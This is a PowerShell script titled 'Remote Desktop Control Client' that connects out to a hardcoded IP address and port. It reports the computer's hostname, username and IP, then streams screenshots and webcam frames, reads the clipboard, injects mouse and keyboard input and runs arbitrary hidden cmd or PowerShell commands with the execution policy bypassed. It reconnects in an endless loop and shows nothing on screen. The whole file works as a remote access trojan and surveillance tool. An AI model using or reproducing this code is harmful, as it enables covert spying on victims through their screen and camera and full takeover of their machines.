# Remote Desktop Control Client
$ServerIP = "144.172.88.250"
$ServerPort = 6000

Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32API {
    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, uint dx, uint dy, int dwData, int dwExtraInfo);
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    public const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
    public const uint MOUSEEVENTF_LEFTUP = 0x0004;
    public const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    public const uint MOUSEEVENTF_RIGHTUP = 0x0010;
    public const uint MOUSEEVENTF_WHEEL = 0x0800;
}
"@

$global:tcpClient = $null
$global:stream = $null
$global:running = $true
$global:streaming = $false
$global:cameraActive = $false
$global:hostname = $env:COMPUTERNAME
$global:username = $env:USERNAME
$global:localIP = try { (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -ne "127.0.0.1"} | Select-Object -First 1).IPAddress } catch { "Unknown" }
$global:screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$global:screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
$global:camProcess = $null
$global:shellProcess = $null
$global:shellReader = $null
$global:webcam = $null

# Native Windows Camera Support (No Python needed!)
Add-Type -AssemblyName System.Drawing
Add-Type -ReferencedAssemblies @('System.Drawing', 'System.Windows.Forms') @"
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

public class WebcamCapture {
    [DllImport("avicap32.dll")] private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hwndParent, int nID);
    [DllImport("user32.dll")] private static extern bool SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] private static extern bool DestroyWindow(IntPtr hWnd);

    private const int WM_CAP_DRIVER_CONNECT = 0x40A;
    private const int WM_CAP_DRIVER_DISCONNECT = 0x40B;
    private const int WM_CAP_SET_PREVIEW = 0x432;
    private const int WM_CAP_SET_PREVIEWRATE = 0x434;
    private const int WM_CAP_GRAB_FRAME = 0x43C;
    private const int WM_CAP_GET_FRAME = 0x43D;
    private const int WM_CAP_COPY = 0x41E;

    private IntPtr hWnd = IntPtr.Zero;

    public bool Start(int deviceIndex = 0) {
        try {
            hWnd = capCreateCaptureWindowA("WebcamCapture", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
            if (hWnd == IntPtr.Zero) return false;
            if (!SendMessage(hWnd, WM_CAP_DRIVER_CONNECT, (IntPtr)deviceIndex, IntPtr.Zero)) {
                DestroyWindow(hWnd);
                hWnd = IntPtr.Zero;
                return false;
            }
            SendMessage(hWnd, WM_CAP_SET_PREVIEW, IntPtr.Zero, IntPtr.Zero);
            return true;
        } catch { return false; }
    }

    public byte[] CaptureFrame() {
        if (hWnd == IntPtr.Zero) return null;
        try {
            SendMessage(hWnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
            SendMessage(hWnd, WM_CAP_COPY, IntPtr.Zero, IntPtr.Zero);
            System.Windows.Forms.IDataObject data = System.Windows.Forms.Clipboard.GetDataObject();
            if (data != null && data.GetDataPresent(typeof(Bitmap))) {
                Bitmap bmp = (Bitmap)data.GetData(typeof(Bitmap));
                using (System.IO.MemoryStream ms = new System.IO.MemoryStream()) {
                    bmp.Save(ms, ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
            return null;
        } catch { return null; }
    }

    public void Stop() {
        if (hWnd != IntPtr.Zero) {
            SendMessage(hWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
            DestroyWindow(hWnd);
            hWnd = IntPtr.Zero;
        }
    }

    public static bool IsCameraAvailable() {
        try {
            IntPtr hWnd = capCreateCaptureWindowA("Test", 0, 0, 0, 1, 1, IntPtr.Zero, 0);
            if (hWnd == IntPtr.Zero) return false;
            bool connected = SendMessage(hWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero);
            if (connected) SendMessage(hWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
            DestroyWindow(hWnd);
            return connected;
        } catch { return false; }
    }
}
"@

# Detect camera availability
$global:cameraAvailable = $false
try { $global:cameraAvailable = [WebcamCapture]::IsCameraAvailable() } catch {}

function Send-Command {
    param([string]$CommandJSON)
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($CommandJSON + "`n")
        $global:stream.Write($bytes, 0, $bytes.Length)
        $global:stream.Flush()
        return $true
    } catch { return $false }
}

function Send-Screen {
    try {
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $imageBytes = $ms.ToArray()
        $graphics.Dispose(); $bitmap.Dispose(); $ms.Dispose()

        if (-not (Send-Command (@{type = "SCREEN"} | ConvertTo-Json -Compress))) { return $false }

        $lengthBytes = [BitConverter]::GetBytes([uint32]$imageBytes.Length)
        [Array]::Reverse($lengthBytes)
        $global:stream.Write($lengthBytes, 0, 4)
        $global:stream.Write($imageBytes, 0, $imageBytes.Length)
        $global:stream.Flush()
        return $true
    } catch { return $false }
}

function Start-Camera {
    try {
        $global:webcam = New-Object WebcamCapture
        if ($global:webcam.Start(0)) {
            $global:cameraActive = $true
            Send-Command (@{type = "CAMERA_FRAME"; status = "active"} | ConvertTo-Json -Compress)
        } else {
            $global:webcam = $null
            $global:cameraActive = $false
            Send-Command (@{type = "CAMERA_FRAME"; status = "error"; error = "Failed to connect to camera"} | ConvertTo-Json -Compress)
        }
    } catch {
        $global:webcam = $null
        $global:cameraActive = $false
        Send-Command (@{type = "CAMERA_FRAME"; status = "error"; error = "$_"} | ConvertTo-Json -Compress)
    }
}

function Send-CameraFrame {
    try {
        if (-not $global:cameraActive -or -not $global:webcam) {
            $global:cameraActive = $false
            return
        }

        $jpegBuf = $global:webcam.CaptureFrame()
        if (-not $jpegBuf -or $jpegBuf.Length -eq 0) { return }

        if (-not (Send-Command (@{type = "CAMERA_FRAME"} | ConvertTo-Json -Compress))) {
            $global:cameraActive = $false
            return
        }

        $lengthBytes = [BitConverter]::GetBytes([uint32]$jpegBuf.Length)
        [Array]::Reverse($lengthBytes)
        $global:stream.Write($lengthBytes, 0, 4)
        $global:stream.Write($jpegBuf, 0, $jpegBuf.Length)
        $global:stream.Flush()
    } catch {
        $global:cameraActive = $false
    }
}

function Stop-Camera {
    try {
        $global:cameraActive = $false
        if ($global:webcam) {
            $global:webcam.Stop()
            $global:webcam = $null
        }
        Send-Command (@{type = "CAMERA_FRAME"; status = "inactive"} | ConvertTo-Json -Compress)
    } catch {}
}

function Execute-ShellCommand {
    param([string]$Command, [string]$ShellType = "cmd")
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        if ($ShellType -eq "powershell") {
            $psi.FileName = "powershell.exe"
            # Wrap command to ensure output with Out-String
            $wrappedCmd = "& { $Command } | Out-String -Width 120"
            $psi.Arguments = "-NoLogo -NoProfile -ExecutionPolicy Bypass -Command `"$wrappedCmd`""
        } else {
            $psi.FileName = "cmd.exe"
            $psi.Arguments = "/c $Command 2>&1"
        }
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.CreateNoWindow = $true
        $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
        $psi.StandardErrorEncoding = [System.Text.Encoding]::UTF8

        $process = [System.Diagnostics.Process]::Start($psi)
        $stdout = $process.StandardOutput.ReadToEnd()
        $stderr = $process.StandardError.ReadToEnd()
        $process.WaitForExit()

        $output = ""
        if ($stdout) { $output += $stdout.TrimEnd() }
        if ($stderr) {
            if ($output) { $output += "`r`n" }
            $output += "[ERROR] $stderr".TrimEnd()
        }

        if (-not $output) { $output = "(No output)" }
        Send-Command (@{type = "SHELL_OUTPUT"; output = $output + "`r`n"} | ConvertTo-Json -Compress)
    } catch {
        Send-Command (@{type = "SHELL_OUTPUT"; output = "[ERROR] $_`r`n"} | ConvertTo-Json -Compress)
    }
}

function Read-Line {
    try {
        $bytes = New-Object System.Collections.Generic.List[byte]
        while ($true) {
            $byte = $global:stream.ReadByte()
            if ($byte -eq -1) { return $null }
            if ($byte -eq 10) { break }
            $bytes.Add($byte)
        }
        return [System.Text.Encoding]::UTF8.GetString($bytes.ToArray())
    } catch { return $null }
}

function Process-Command {
    param([string]$CommandJSON)
    try {
        $c = $CommandJSON | ConvertFrom-Json
        switch ($c.type) {
            "START_STREAM" { $global:streaming = $true }
            "STOP_STREAM"  { $global:streaming = $false }
            "MOUSE_MOVE" { [Win32API]::SetCursorPos($c.x, $c.y) }
            "MOUSE_DOWN" {
                [Win32API]::SetCursorPos($c.x, $c.y)
                Start-Sleep -Milliseconds 10
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
            }
            "MOUSE_UP" { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0) }
            "MOUSE_CLICK" {
                [Win32API]::SetCursorPos($c.x, $c.y)
                Start-Sleep -Milliseconds 10
                $down = if ($c.button -eq "right") { [Win32API]::MOUSEEVENTF_RIGHTDOWN } else { [Win32API]::MOUSEEVENTF_LEFTDOWN }
                $up = if ($c.button -eq "right") { [Win32API]::MOUSEEVENTF_RIGHTUP } else { [Win32API]::MOUSEEVENTF_LEFTUP }
                [Win32API]::mouse_event($down, 0, 0, 0, 0)
                Start-Sleep -Milliseconds 50
                [Win32API]::mouse_event($up, 0, 0, 0, 0)
            }
            "MOUSE_DOUBLE_CLICK" {
                [Win32API]::SetCursorPos($c.x, $c.y)
                Start-Sleep -Milliseconds 10
                $down = if ($c.button -eq "right") { [Win32API]::MOUSEEVENTF_RIGHTDOWN } else { [Win32API]::MOUSEEVENTF_LEFTDOWN }
                $up = if ($c.button -eq "right") { [Win32API]::MOUSEEVENTF_RIGHTUP } else { [Win32API]::MOUSEEVENTF_LEFTUP }
                for ($i = 0; $i -lt 2; $i++) {
                    [Win32API]::mouse_event($down, 0, 0, 0, 0)
                    Start-Sleep -Milliseconds 50
                    [Win32API]::mouse_event($up, 0, 0, 0, 0)
                    if ($i -eq 0) { Start-Sleep -Milliseconds 50 }
                }
            }
            "KEYBOARD" { try { [System.Windows.Forms.SendKeys]::SendWait($c.key) } catch {} }
            "MOUSE_SCROLL" {
                [Win32API]::SetCursorPos($c.x, $c.y)
                Start-Sleep -Milliseconds 10
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_WHEEL, 0, 0, ($c.delta * 120), 0)
            }
            "CLIPBOARD_SET" { try { Set-Clipboard -Value $c.text } catch {} }
            "CLIPBOARD_GET" {
                try {
                    $clipText = Get-Clipboard -Raw -ErrorAction Stop
                    Send-Command (@{type = "CLIPBOARD_TEXT"; text = $clipText} | ConvertTo-Json -Compress)
                } catch {
                    Send-Command (@{type = "CLIPBOARD_TEXT"; text = ""} | ConvertTo-Json -Compress)
                }
            }
            "CAMERA_ON"  { Start-Camera }
            "CAMERA_OFF" { Stop-Camera }
            "SHELL_START" {
                $global:shellType = if ($c.shell_type) { $c.shell_type } else { "cmd" }
                Send-Command (@{type = "SHELL_OUTPUT"; output = "Shell ready ($global:shellType). Send commands.`r`n"} | ConvertTo-Json -Compress)
            }
            "SHELL_STOP" {
                Send-Command (@{type = "SHELL_OUTPUT"; output = "Shell closed.`r`n"} | ConvertTo-Json -Compress)
            }
            "SHELL_INPUT" {
                $shellType = if ($global:shellType) { $global:shellType } else { "cmd" }
                Execute-ShellCommand -Command $c.command -ShellType $shellType
            }
            "DISCONNECT" { $global:running = $false }
            "PING" { Send-Command (@{type = "PONG"} | ConvertTo-Json -Compress) }
        }
    } catch {}
}

function Start-Client {
    try {
        $global:tcpClient = New-Object System.Net.Sockets.TcpClient
        if (-not $global:tcpClient.ConnectAsync($ServerIP, $ServerPort).Wait(5000)) {
            $global:tcpClient.Close(); throw "Connection timed out"
        }
        $global:stream = $global:tcpClient.GetStream()
        $global:stream.ReadTimeout = 30000

        $identify = @{
            type = "IDENTIFY"
            hostname = $global:hostname
            username = $global:username
            ip = $global:localIP
            version = "1.0"
            camera_available = $global:cameraAvailable
            screen_width = $global:screenWidth
            screen_height = $global:screenHeight
            os_info = $(
                $build = [System.Environment]::OSVersion.Version.Build
                if ($build -ge 22000) { "Windows 11 (Build $build)" } else { "Windows 10 (Build $build)" }
            )
        } | ConvertTo-Json -Compress
        if (-not (Send-Command $identify)) { throw "Failed to send identification" }

        $lastScreen = [DateTime]::Now
        $lastCamera = [DateTime]::Now
        $lastHB = [DateTime]::Now

        while ($global:running) {
            $now = [DateTime]::Now
            if ($global:streaming -and ($now - $lastScreen).TotalMilliseconds -ge 250) {
                if (Send-Screen) { $lastScreen = $now }
                else { Start-Sleep -Milliseconds 100 }
            }
            if ($global:cameraActive -and ($now - $lastCamera).TotalMilliseconds -ge 500) {
                Send-CameraFrame; $lastCamera = $now
            }
            if (($now - $lastHB).TotalMilliseconds -ge 5000) {
                if (-not (Send-Command (@{type = "HEARTBEAT"; timestamp = $now.ToString("o")} | ConvertTo-Json -Compress))) { break }
                $lastHB = $now
            }
            if ($global:stream.DataAvailable) {
                $line = Read-Line
                if ($line) { Process-Command $line } else { break }
            }
            Start-Sleep -Milliseconds 50
        }
    } catch {}
    finally {
        if ($global:stream) { $global:stream.Close() }
        if ($global:tcpClient) { $global:tcpClient.Close() }
    }
}

$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { $global:running = $false }

try {
    Start-Client
    while ($true) {
        Start-Sleep -Seconds 5
        $global:running = $true
        Start-Client
    }
} catch {}
